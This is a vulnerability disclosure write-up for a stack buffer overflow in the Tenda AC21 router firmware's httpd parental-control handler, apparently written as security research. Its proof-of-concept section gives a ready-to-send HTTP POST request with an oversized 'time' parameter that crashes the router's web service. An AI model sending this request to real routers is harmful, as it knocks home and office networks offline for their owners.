# Tenda AC21(V16.03.08.15) contains stack Buffer Overflow Vulnerability

## overview

- Manufacturer's website information：https://www.tenda.com.cn/
- Firmware download address: https://www.tenda.com.cn/download/detail-3419.html

## product information

Tenda A21(V16.03.08.15), latest version of simulation overview：

![image-20220902202242019](readme.assets/image-20220902202242019.png)

## description

### 1. Vulnerability Details

Tenda AC21(V16.03.08.15) contains a stack overflow vulnerability in file `/bin/httpd`, function`saveParentControlInfo ` .

This vulnerability allows attackers to cause a Denial of Service (DoS) via the `time` parameter.

In function `saveParentControlInfo`, it calls `compare_parentcontrol_time(a1)`, the vulnerability is in this function. 

![image-20220902202709225](readme.assets/image-20220902202709225.png)

It calls `sscanf(s, “%[^-]-%s”, v3, v4)` and `v4` is on the stack, so there is a buffer overflow vulnerability. 

![image-20220902202810293](readme.assets/image-20220902202810293.png)

### 2. Recurring loopholes and POC

In order to reproduce the vulnerability, the following steps can be followed:

1. Boot the firmware by qemu-system or other ways (real machine)
2. Attack with the following POC attacks

```
POST /goform/saveParentControlInfo HTTP/1.1
Host: 192.168.0.1
Content-Length: 137
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.0.1
Referer: http://192.168.0.1/main.html
Accept-Encoding: gzip, deflate
Accept-Language: en,zh-CN;q=0.9,zh;q=0.8
Cookie: password=25d55ad283aa400af464c76d713c07adwfrcvb
Connection: close

time=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa%2daaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

By sending this poc, we can achieve the effect of a denial-of-service(DOS) attack .

![image-20220902202507664](readme.assets/image-20220902202507664.png)